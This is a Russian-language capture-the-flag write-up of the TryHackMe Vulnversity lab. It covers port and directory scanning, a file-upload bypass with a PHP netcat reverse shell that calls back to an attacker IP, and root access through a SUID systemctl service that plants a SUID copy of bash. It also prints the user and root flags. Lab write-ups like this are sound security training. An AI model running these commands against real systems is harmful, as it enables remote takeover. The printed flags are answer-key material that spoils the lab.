# Vulnversity - TryHackMe

## Разведка

Запускаем nmap для сканирования открытых портов
Вывод:
```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-08 17:39 -0400
Nmap scan report for 10.80.147.22
Host is up (0.046s latency).
Not shown: 4994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.91 seconds
```
запускаем Gobuster через gobuster dir -u http://10.80.147.22:3333 -w /usr/share/wordlists/dirb/big.txt -x php
Вывод:
```
.htpasswd            (Status: 403) [Size: 279]
.htaccess.php        (Status: 403) [Size: 279]
.htaccess            (Status: 403) [Size: 279]
.htpasswd.php        (Status: 403) [Size: 279]
css                  (Status: 301) [Size: 317] [--> http://10.80.147.22:3333/css/]
fonts                (Status: 301) [Size: 319] [--> http://10.80.147.22:3333/fonts/]
images               (Status: 301) [Size: 320] [--> http://10.80.147.22:3333/images/]
internal             (Status: 301) [Size: 322] [--> http://10.80.147.22:3333/internal/]
js                   (Status: 301) [Size: 316] [--> http://10.80.147.22:3333/js/]
server-status        (Status: 403) [Size: 279]
Progress: 40938 / 40938 (100.00%)
===============================================================
Finished
===============================================================
```
## Веб шелл

переходим в директорию /internal и видим панель для загрузки файлов, пробуем загрузить .phtml реверс шелл.
Код шелла:
`<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.129.112 8000 >/tmp/f"); ?>`
загрузка проходит успешно. Т.к. gobuster не нашел никаких папок для загруженных файлов, возможно они находятся в /internal, проверяю /internal/uploads и нахожу свой шелл. На атакующей машине запускаю `nc -lnvp 8000` и запускаю шелл в веб загрузках. и соединение установлено. Строкой python3 -c 'import pty; pty.spawn("/bin/bash")' стабилизируем шелл.
Начинаю лазить по папкам. Перехожу по одной директории назад параллельно провверяя каждую, дохожу до корня. Решаю проверить директорию /home, в ней две папки /bill и /ubuntu. В папке пользователя bill нахожу user.txt и проверяю что внутри.
Содержимое:
`8bd7992fbe8a6ad22a63361004cfcedb`

## Повышение привилегий

Пользовательский флаг найден, пора повышать привилегии, ищем файлы с suid битами командой `find / -perm -4000 2>/dev/null`
в выводе я заметил:
`/bin/systemctl`
с помощью этой программы, если на ней установлен suid бит, как в нашем случае, можно повысиить привилегии введя такой скрипт:
```
echo '[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service
```
Файл file.service  - это наш файл rootkit.service с конфигами для systemctl как я понял, после того как порасспрашивал нейронку
запускать в ExecStart мы будем `/bin/bash -c "cp /bin/bash /tmp/bash && chmod +s /tmp/bash"`, эта команда скопирует bash в директорию /tmp, потому что в /tmp обычно права на создание и копирование туда файлов не требуется никому, даем этому bash в tmp suid-бит, в нашем случае скрипт будет выглядеть вот так:
```
cat << 'EOF' > /tmp/rootkit.service
[Unit]
Description=Rootkit Service

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "cp /bin/bash /tmp/bash && chmod +s /tmp/bash"

[Install]
WantedBy=multi-user.target
EOF
```
Запускаем.
Дальше нам нужно дать ссылку файла rootkit.service для systemd:
`systemctl link /tmp/rootkit.service`
А потом сразу запустить службу с флагом --now
`sudo systemctl enable --now /tmp/rootkit.service`
после этого можно прописывать tmp/bash с флагом -p, для того, чтобы bash не сбрасывал привилегии, и я получаю рута. Идем в директорию /root и там сразу лежит флаг root.txt в таком виде: `a58ff8579f0a9270368d33a9966c7fd5`
